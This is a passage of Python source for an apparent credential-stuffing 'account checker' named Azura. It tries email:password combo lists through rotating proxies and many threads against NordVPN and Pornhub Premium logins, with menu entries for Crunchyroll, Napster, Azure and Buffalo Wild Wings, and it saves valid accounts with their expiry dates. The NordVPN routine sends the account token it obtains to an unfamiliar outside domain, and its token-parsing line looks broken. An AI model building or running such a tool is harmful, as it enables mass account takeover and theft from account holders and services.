            Counters.retries += 1

    def NordVPNCheck(self, email, password):
        sess = requests
        proxy = random.choice(self.proxies)
        sess.proxies.update(proxy)
        expirate  = "Expiration Date: "

        headers = {
            "Content-Type": "application/json"
        }
        json_ = {
            "username": email, 
            "password": password
        }
        get_token = sess.post(
            url="https://api.nordvpn.com/v1/users/tokens",
            json=json_,
            headers=headers,
            proxies=proxy,
            timeout=int(Azura.timeout)
        ).text

        if 'user_id' in get_token:
            token = "token:" + re.search('token":"(.*?)"', input).group(1)
            str1 = base64.b64encode(token.encode('ascii')).decode('ascii')
            headers = {
                "Authorization": "Basic " + str1
            }

            capture = sess.get(
                url="https://zwyr157wwiu6eior.com/v1/users/services", 
                headers=headers,
                proxies=proxy,
                timeout=int(Azura.timeout)
            ).text

            if "expires_at" in capture:
                services = json.loads(capture)
                Counters.hits += 1
                Counters.checked += 1

                for token in services:
                    if token["service"]["name"] == "VPN":
                        expires_at = datetime.strptime(token["expires_at"].split(' ')[0], "%Y-%m-%d").date()
                        if datetime.utcnow().date() < expires_at:
                            expirate += str(expires_at)
                        else:
                            expirate = "Expired"
                
                if Azura.print_hits == True:
                    print(f'{Fore.LIGHTGREEN_EX}| {color_primary}{email}:{password} {secundary_color}| {color_primary}Expired: {secundary_color}{expirate}')  
                elif Azura.print_hits == False:
                    pass
                else:
                    print(f'{Fore.LIGHTGREEN_EX}| {color_primary}{email}:{password} {secundary_color}| {color_primary}Expired: {secundary_color}{expirate}')  
                
                if self.check_all == True:
                    open(f'results/{unix}/NordVPN-hits.txt', 'a', encoding='UTF-8', errors='ignore').write(f'{email}:{password} - Expires: {expirate}\n')
                else:
                    open(f'results/NordVPN/{unix}/hits.txt', 'a', encoding='UTF-8', errors='ignore').write(f'{email}:{password} - Expires: {expirate}\n')
        elif '"Invalid password"' in get_token:
            Counters.bad += 1
            Counters.checked += 1
            if Azura.print_bads == True:
                print(f'{Fore.LIGHTRED_EX}| {Fore.LIGHTWHITE_EX}{email}:{password}')
            elif Azura.print_bads == False:
                pass
            else:
                pass
            if Azura.save_bads == True:
                open(f'results/NordVPN/{unix}/bads.txt', 'a', encoding='UTF-8', errors='ignore').write(f'{email}:{password}\n')
        elif '"Invalid username"' in get_token:
            Counters.bad += 1
            Counters.checked += 1
            if Azura.print_bads == True:
                print(f'{Fore.LIGHTRED_EX}| {Fore.LIGHTWHITE_EX}{email}:{password}')
            elif Azura.print_bads == False:
                pass
            else:
                pass
            if Azura.save_bads == True:
                open(f'results/NordVPN/{unix}/bads.txt', 'a', encoding='UTF-8', errors='ignore').write(f'{email}:{password}\n')
        elif '"code":101301' in get_token:
            Counters.bad += 1
            Counters.checked += 1
            if Azura.print_bads == True:
                print(f'{Fore.LIGHTRED_EX}| {Fore.LIGHTWHITE_EX}{email}:{password}')
            elif Azura.print_bads == False:
                pass
            else:
                pass
            if Azura.save_bads == True:
                open(f'results/NordVPN/{unix}/bads.txt', 'a', encoding='UTF-8', errors='ignore').write(f'{email}:{password}\n')
        elif '"message":"Unauthorized"' in get_token:
            Counters.bad += 1
            Counters.checked += 1
            if Azura.print_bads == True:
                print(f'{Fore.LIGHTRED_EX}| {Fore.LIGHTWHITE_EX}{email}:{password}')
            elif Azura.print_bads == False:
                pass
            else:
                pass
            if Azura.save_bads == True:
                open(f'results/NordVPN/{unix}/bads.txt', 'a', encoding='UTF-8', errors='ignore').write(f'{email}:{password}\n')
        else:
            Counters.retries += 1

    def PhCheck(self, email, password):
        headers = {
            "Content-Type":"application/x-www-form-urlencoded",
            "Host": "www.pornhubpremium.com" ,
            "Origin": "https://www.pornhubpremium.com" ,
            "Referer": "https://www.pornhubpremium.com/premium/login" ,
            "sec-ch-ua": "\"Chromium\";v=\"88\", \"Google Chrome\";v=\"88\", \";Not A Brand\";v=\"99\"" ,
            "sec-ch-ua-mobile": "?0" ,
            "Sec-Fetch-Dest": "empty" ,
            "Sec-Fetch-Mode": "cors" ,
            "Sec-Fetch-Site": "same-origin" ,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36" ,
            "X-Requested-With": "XMLHttpRequest"
        }
        sess = requests
        proxy = random.choice(self.proxies)
        sess.proxies.update(proxy)
        
        data = "username={}&password={}&token={}&redirect=&from=pc_premium_login&segment=straight"
        token = sess.get("https://www.pornhubpremium.com/premium/login", proxies=proxy, timeout=int(Azura.timeout)).text.split("<input type=\"hidden\" name=\"token\" id=\"token\" value=\"")[1].split("\" />")[0]
        response = sess.post("https://www.pornhubpremium.com/front/authenticate",headers=headers,data=data.format(email,quote(password),token), proxies=proxy, timeout=int(Azura.timeout)).text
        
        if "success\":\"0\",\"" in response:
            Counters.bad += 1
            Counters.checked += 1
            if Azura.print_bads:
                print(f'{Fore.LIGHTRED_EX}|{Fore.WHITE} {email}:{password}')
            else:
                pass
            if Azura.save_bads == True:
                open(f'results/Pornhub/{unix}/Bads.txt', 'a').write(f'{email}:{password}\n')
            else:
                pass
        elif "success\":\"1\",\"" in response:
            Counters.hits += 1
            Counters.checked += 1
            
            try:
                plan = sess.get("https://www.pornhubpremium.com/user/manage/start", proxies=proxy, timeout=int(Azura.timeout)).text 
                
                if "Next Billing Date" in plan:
                    expiry = plan.split("p id=\"expiryDatePremium\">Next Billing Date ")[1].split("</date></p>")[0]
                    print(f"{Fore.LIGHTGREEN_EX}| {secundary_color}{email}:{password} {secundary_color}| {color_primary}Expire: {secundary_color}{expiry}") 
                    open(f'results/Pornhub/{unix}/Hits-Capture.txt', 'a').write(f'{email}:{password} - Expire: {expiry}\n')
                else:
                    print(f'{Fore.LIGHTGREEN_EX}| {secundary_color}{email}:{password} {secundary_color}| {color_primary}Expire:{secundary_color} None')
                    open(f'results/Pornhub/{unix}/Hits.txt', 'a').write(f'{email}:{password}\n')
            except:
                print(f"{Fore.LIGHTGREEN_EX}| {secundary_color}{email}:{password}") 
                open(f'results/Pornhub/{unix}/Hits.txt', 'a').write(f'{email}:{password}\n')
        else:
            Counters.retries += 1        

    def worker_crunchy(self, combos, thread_id):
        while self.check[thread_id] < len(combos):
            try:
                combination = combos[self.check[thread_id]].split(':')
                self.CrunchyCheck(combination[0], combination[1])
                self.check[thread_id] += 1 
            except Exception as e:
                pass

    def worker_napster(self, combos, thread_id):
        while self.check[thread_id] < len(combos):
            try:
                combination = combos[self.check[thread_id]].split(':')
                self.NapsterCheck(combination[0], combination[1])
                self.check[thread_id] += 1 
            except Exception as e:
                pass

    def worker_nord(self, combos, thread_id):
        while self.check[thread_id] < len(combos):
            try:
                combination = combos[self.check[thread_id]].split(':')
                self.NordVPNCheck(combination[0], combination[1])
                self.check[thread_id] += 1 
            except Exception as e:
                pass

    def worker_azure(self, combos, thread_id):
        while self.check[thread_id] < len(combos):
            try:
                combination = combos[self.check[thread_id]].split(':')
                self.AzureCheck(combination[0], combination[1])
                self.check[thread_id] += 1 
            except Exception as e:
                pass

    def worker_buff(self, combos, thread_id):
        while self.check[thread_id] < len(combos):
            try:
                combination = combos[self.check[thread_id]].split(':')
                self.BuffaloCheck(combination[0], combination[1])
                self.check[thread_id] += 1 
            except Exception as e:
                pass

    def worker_ph(self, combos, thread_id):
        while self.check[thread_id] < len(combos):
            try:
                combination = combos[self.check[thread_id]].split(':')
                self.PhCheck(combination[0], combination[1])
                self.check[thread_id] += 1 
            except Exception as e:
                pass

    def start_work_napster(self):
        self.threadcount = Azura.threads
        threads = []
        self.check = [0 for i in range(self.threadcount)]

        for i in range(self.threadcount):
            sliced_combo = self.combo[int(len(self.combo) / self.threadcount * i): int(len(self.combo)/ self.threadcount* (i+1))]
            t = threading.Thread(target= self.worker_napster, args= (sliced_combo, i,) )
            threads.append(t)
            t.start()
                
        for t in threads:
            t.join()

    def start_work_crunchy(self):
        self.threadcount = Azura.threads
        threads = []
        self.check = [0 for i in range(self.threadcount)]

        for i in range(self.threadcount):
            sliced_combo = self.combo[int(len(self.combo) / self.threadcount * i): int(len(self.combo)/ self.threadcount* (i+1))]
            t = threading.Thread(target= self.worker_crunchy, args= (sliced_combo, i,) )
            threads.append(t)
            t.start()
                
        for t in threads:
            t.join()

    def start_work_nordvpn(self):
        self.threadcount = Azura.threads
        threads = []
        self.check = [0 for i in range(self.threadcount)]

        for i in range(self.threadcount):
            sliced_combo = self.combo[int(len(self.combo) / self.threadcount * i): int(len(self.combo)/ self.threadcount* (i+1))]
            t = threading.Thread(target= self.worker_nord, args= (sliced_combo, i,) )
            threads.append(t)
            t.start()
                
        for t in threads:
            t.join()

    def start_work_azure(self):
        self.threadcount = Azura.threads
        threads = []
        self.check = [0 for i in range(self.threadcount)]

        for i in range(self.threadcount):
            sliced_combo = self.combo[int(len(self.combo) / self.threadcount * i): int(len(self.combo)/ self.threadcount* (i+1))]
            t = threading.Thread(target= self.worker_azure, args= (sliced_combo, i,) )
            threads.append(t)
            t.start()
                
        for t in threads:
            t.join()

    def start_work_buff(self):
        self.threadcount = Azura.threads
        threads = []
        self.check = [0 for i in range(self.threadcount)]

        for i in range(self.threadcount):
            sliced_combo = self.combo[int(len(self.combo) / self.threadcount * i): int(len(self.combo)/ self.threadcount* (i+1))]
            t = threading.Thread(target= self.worker_buff, args= (sliced_combo, i,) )
            threads.append(t)
            t.start()
                
        for t in threads:
            t.join()

    def start_work_ph(self):
        self.threadcount = Azura.threads
        threads = []
        self.check = [0 for i in range(self.threadcount)]

        for i in range(self.threadcount):
            sliced_combo = self.combo[int(len(self.combo) / self.threadcount * i): int(len(self.combo)/ self.threadcount* (i+1))]
            t = threading.Thread(target= self.worker_ph, args= (sliced_combo, i,) )
            threads.append(t)
            t.start()
                
        for t in threads:
            t.join()

    def Modules(self, choice):
        if choice == '1':
            paths = 'results/Crunchyroll'
            paths_ = f'results/Crunchyroll/{unix}'
            self.mod = 'Crunchyroll'

            if not path.exists('results'):
                mkdir('results')
            
            if not path.exists(paths):
                mkdir(paths)
            
            if not path.exists(paths_):
                mkdir(paths_)

            self.ComboLoad()
            self.ProxyLoad()
            console.clear()

            print(text)
            print(f'{secundary_color}| {color_primary}Combo Loaded ~{secundary_color} {Counters.total}\n{secundary_color}| {color_primary}Proxies Loaded ~ {secundary_color}{Counters.total_proxies}\n{secundary_color}| {color_primary}Threads ~{secundary_color} {Azura.threads}\n{secundary_color}| {color_primary}Timeout ~{secundary_color} {Azura.timeout}\n{secundary_color}| {color_primary}Proxy ~{secundary_color} {self.current_proxy}')

            threading.Thread(target=self.cpm_counter, daemon=True).start()
            threading.Thread(target=self.update_title).start()
            threading.Thread(target=self.rpc).start()
            self.start_time = time()
            self.start_work_crunchy()
                
            print(f'[{Fore.LIGHTGREEN_EX}+{Fore.RESET}] Task completed')
            system('pause>nul')
        elif choice == '2':
            paths = 'results/Napster'
            paths_ = f'results/Napster/{unix}'

            if not path.exists('results'):
                mkdir('results')
            
            if not path.exists(paths):
                mkdir(paths)
            
            if not path.exists(paths_):
                mkdir(paths_)

            self.mod = 'Napster'
            self.ComboLoad()
            self.ProxyLoad()
            console.clear()

            print(text)
            print(f'{secundary_color}| {color_primary}Combo Loaded ~{secundary_color} {Counters.total}\n{secundary_color}| {color_primary}Proxies Loaded ~ {secundary_color}{Counters.total_proxies}\n{secundary_color}| {color_primary}Threads ~{secundary_color} {Azura.threads}\n{secundary_color}| {color_primary}Timeout ~{secundary_color} {Azura.timeout}\n{secundary_color}| {color_primary}Proxy ~{secundary_color} {self.current_proxy}')

            threading.Thread(target=self.cpm_counter, daemon=True).start()
            threading.Thread(target=self.update_title).start()
            threading.Thread(target=self.rpc).start()
            self.start_time = time()
            self.start_work_napster()
                
            print(f'[{Fore.LIGHTGREEN_EX}+{Fore.RESET}] Task completed')
            system('pause>nul')
        elif choice == '3':
            paths = 'results/Azure'
            paths_ = f'results/Azure/{unix}'

            if not path.exists('results'):
                mkdir('results')
            
            if not path.exists(paths):
                mkdir(paths)
            
            if not path.exists(paths_):
                mkdir(paths_)

            self.mod = 'Azure'
            self.ComboLoad()
            self.ProxyLoad()
            console.clear()

            print(text)
            print(f'{secundary_color}| {color_primary}Combo Loaded ~{secundary_color} {Counters.total}\n{secundary_color}| {color_primary}Proxies Loaded ~ {secundary_color}{Counters.total_proxies}\n{secundary_color}| {color_primary}Threads ~{secundary_color} {Azura.threads}\n{secundary_color}| {color_primary}Timeout ~{secundary_color} {Azura.timeout}\n{secundary_color}| {color_primary}Proxy ~{secundary_color} {self.current_proxy}')

            threading.Thread(target=self.cpm_counter, daemon=True).start()
            threading.Thread(target=self.update_title).start()
            threading.Thread(target=self.rpc).start()
            self.start_time = time()
            self.start_work_azure()
                
            print(f'[{Fore.LIGHTGREEN_EX}+{Fore.RESET}] Task completed')
            system('pause>nul')
        elif choice == '4':
            paths = 'results/NordVPN'
            paths_ = f'results/NordVPN/{unix}'

            if not path.exists('results'):
                mkdir('results')
            
            if not path.exists(paths):
                mkdir(paths)
            
            if not path.exists(paths_):
                mkdir(paths_)

            self.mod = 'NordVPN'
            self.ComboLoad()
            self.ProxyLoad()
            console.clear()

            print(text)
            print(f'{secundary_color}| {color_primary}Combo Loaded ~{secundary_color} {Counters.total}\n{secundary_color}| {color_primary}Proxies Loaded ~ {secundary_color}{Counters.total_proxies}\n{secundary_color}| {color_primary}Threads ~{secundary_color} {Azura.threads}\n{secundary_color}| {color_primary}Timeout ~{secundary_color} {Azura.timeout}\n{secundary_color}| {color_primary}Proxy ~{secundary_color} {self.current_proxy}')

            threading.Thread(target=self.cpm_counter, daemon=True).start()
            threading.Thread(target=self.update_title).start()
            threading.Thread(target=self.rpc).start()
            self.start_time = time()
            self.start_work_nordvpn()
                
            print(f'[{Fore.LIGHTGREEN_EX}+{Fore.RESET}] Task completed')
            system('pause>nul')
        elif choice == '5':
            paths = 'results/Buffalo'
            paths_ = f'results/Buffalo/{unix}'

            if not path.exists('results'):
                mkdir('results')
            
            if not path.exists(paths):
                mkdir(paths)
            
            if not path.exists(paths_):
                mkdir(paths_)

            self.mod = 'BuffaloWildWings.'
            self.ComboLoad()
            self.ProxyLoad()
            console.clear()

            print(text)
            print(f'{secundary_color}| {color_primary}Combo Loaded ~{secundary_color} {Counters.total}\n{secundary_color}| {color_primary}Proxies Loaded ~ {secundary_color}{Counters.total_proxies}\n{secundary_color}| {color_primary}Threads ~{secundary_color} {Azura.threads}\n{secundary_color}| {color_primary}Timeout ~{secundary_color} {Azura.timeout}\n{secundary_color}| {color_primary}Proxy ~{secundary_color} {self.current_proxy}')

            threading.Thread(target=self.cpm_counter, daemon=True).start()
            threading.Thread(target=self.update_title).start()
            threading.Thread(target=self.rpc).start()
            self.start_time = time()
            self.start_work_buff()
                
            print(f'[{Fore.LIGHTGREEN_EX}+{Fore.RESET}] Task completed')
            system('pause>nul')
        elif choice == '6':
            paths = 'results/Pornhub'
            paths_ = f'results/Pornhub/{unix}'

            if not path.exists('results'):
                mkdir('results')
            
            if not path.exists(paths):
                mkdir(paths)
            
            if not path.exists(paths_):
                mkdir(paths_)

            self.mod = 'Pornhub'
            self.ComboLoad()
            self.ProxyLoad()
            console.clear()

            print(text)
            print(f'{secundary_color}| {color_primary}Combo Loaded ~{secundary_color} {Counters.total}\n{secundary_color}| {color_primary}Proxies Loaded ~ {secundary_color}{Counters.total_proxies}\n{secundary_color}| {color_primary}Threads ~{secundary_color} {Azura.threads}\n{secundary_color}| {color_primary}Timeout ~{secundary_color} {Azura.timeout}\n{secundary_color}| {color_primary}Proxy ~{secundary_color} {self.current_proxy}')

            threading.Thread(target=self.cpm_counter, daemon=True).start()
            threading.Thread(target=self.update_title).start()
            threading.Thread(target=self.rpc).start()
            self.start_time = time()
            self.start_work_ph()
                
            print(f'[{Fore.LIGHTGREEN_EX}+{Fore.RESET}] Task completed')
            system('pause>nul')
    
    def proxychecker(self):
        self.valid_ = 0
        self.invalid_ = 0
        self.checked_ = 0
        self.cpm_ = 0
        self.total_ = 0
        self.top_ = False

        if not path.exists('results'):
            mkdir('results')
        
        if not path.exists('results/ProxyChecker'):
            path_ = 'results/ProxyChecker'
            mkdir(path_)

        if not path.exists(f'results/ProxyChecker/{unix}'):
            path__ = f'results/ProxyChecker/{unix}'
            mkdir(path__)

        console.clear()
        print(text)
        console.set_title(f'Azura - ProxyChecker (Tools)')
        self.UpdateRich(state='ProxyChecker', details='Proxy Selector')
        
        pr = input(f'\n{secundary_color}[{color_primary}1{secundary_color}] HTTP/S\n{secundary_color}[{color_primary}2{secundary_color}] Socks4\n{secundary_color}[{color_primary}3{secundary_color}] Socks5\n{secundary_color}[{color_primary}Input{secundary_color}] > ')

        if pr == '1':
            proxysd = 'http/s'
        elif pr == '2':
            proxysd = 'socks4'           
        elif pr == '3':
            proxysd = 'socks5'

        proxy_path = fileopenbox(
            title = 'Select your proxies',
            filetypes='*.txt'
        )

        with open(proxy_path, encoding='utf-8', errors='ignore') as x:
            proxyy = x.read().splitlines()

        print(f'{secundary_color}> {secundary_color}{len(proxyy)} {color_primary}{secundary_color}{proxysd}{color_primary} loaded successfully')
        self.total_ = len(proxyy)
        url = str(input(f'{secundary_color}> Website{color_primary} url for {secundary_color}checking {color_primary}proxies {secundary_color}> '))
        print(f'{secundary_color}> {color_primary}Starting threads.')
        
        def cpm_counter():
            while top:
                if self.checked_ >= 1:
                    now = self.checked_
                    sleep(1)
                    self.cpm_ = (self.checked_ - now) * 20

        def title():
            while top:
                console.set_title(f'Azura | ProxyChecker | Valid: {self.valid_} - Invalid: {self.invalid_} | Checked: {self.checked_} - Remaining: {self.total_ - self.checked_} | CPMs: {self.cpm_} | Type: {proxysd}')

        def checker(proxy, url):
            if '\n' in proxy:
                proxy = proxy.split('\n')
            else:
                proxy = proxy
            if pr == '1':
                proxysdd = {'http': f"http://{proxy}", 'https': f"https://{proxy}"}
            elif pr == '2':
                proxysdd = {'http': f"{proxysd}://{proxy}", 'https': f"{proxysd}://{proxy}"}          
            elif pr == '3':
                proxysdd = {'http': f"{proxysd}://{proxy}", 'https': f"{proxysd}://{proxy}"}
            try:
                s = requests
                s.proxies = proxysdd
                s.headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'}
                respone = s.get(url, timeout = 5, proxies=proxysdd)
                
                if respone.status_code == 200:
                    self.valid_ += 1
                    self.checked_ += 1
                    print(f'{Fore.LIGHTGREEN_EX}> {secundary_color}{proxy} - Status: {Fore.LIGHTGREEN_EX}Working')
                    with open(f'results/ProxyChecker/{unix}/{proxysd}-alive.txt','a') as file:
                        file.write(proxy + '\n')
                else:
                    self.invalid_ += 1
                    self.checked_ += 1
                    print(f'{Fore.RED}> {secundary_color}{proxy} - Status: {Fore.RED}Bad')
                    with open(f'results/ProxyChecker/{unix}/{proxysd}-bad.txt','a') as file:
                        file.write(proxy + '\n')
            except:
                self.invalid_ += 1
                self.checked_ += 1
                print(f'{Fore.RED}> {secundary_color}{proxy} - Status: {Fore.RED}Bad')
                with open(f'results/ProxyChecker/{unix}/{proxysd}-bad.txt','a') as file:
                    file.write(proxy + '\n')

        thread = []
        top = True
        threading.Thread(target=cpm_counter, daemon=True).start()
        for proxy in proxyy:
            threading.Thread(target=title).start()
            t = threading.Thread(target = checker,args=(proxy, url))
            t.start()
            thread.append(t)
            sleep(0.1)
        for i in thread:
            i.join()
            
        top = False
        input()

    def tools(self):
        console.clear()
        print(text)

        console.set_title(f'Azura - Welcome, {self.cracked_name} - Tools')
        self.UpdateRich(state='Tools (menu)')

        print(f'{secundary_color}[{color_primary}+{secundary_color}] Tools\n')
        ab = input(f'{secundary_color}[{color_primary}1{secundary_color}] ProxyChecker\n{secundary_color}[{color_primary}2{secundary_color}] ProxyScraper\n[{color_primary}X{secundary_color}] Back to menu\n\n{secundary_color}[{color_primary}Input{secundary_color}] > ')
        
        if ab == '1':
            console.set_title(f'Azura - Welcome, {self.cracked_name} - Tools (ProxyChecker)')
            self.proxychecker()

    def Main(self):
        print(text)
        console.set_title(f'Azura - Welcome, {self.cracked_name}')
        self.UpdateRich(state='Main Menu.')
        
        choice = input(f'{secundary_color}[{color_primary}1{secundary_color}] Crunchyroll\n{secundary_color}[{color_primary}2{secundary_color}] Napster\n{secundary_color}[{color_primary}3{secundary_color}] Azure\n{secundary_color}[{color_primary}4{secundary_color}] NordVPN\n{secundary_color}[{color_primary}5{secundary_color}] BuffaloWildWings\n{secundary_color}{secundary_color}[{color_primary}6{secundary_color}] Pornhub\n\n{secundary_color}[{color_primary}7{secundary_color}] Tools\n{secundary_color}[{color_primary}X{secundary_color}] Exit\n\n[{color_primary}Input{secundary_color}] > ')

        if choice == '1':
            self.Modules(str(choice))
        elif choice == '2':
            self.Modules(str(choice))
        elif choice == '3':
            self.Modules(str(choice))
        elif choice == '4':
            self.Modules(str(choice))
        elif choice == '5':
            self.Modules(str(choice))
        elif choice == '6':
            self.Modules(str(choice))
        elif choice == '7':
            self.tools()
        elif choice == 'x':
            quit()
        else:
            console.clear()
            self.Main()


if __name__ == '__main__':
    AzuraChecker()
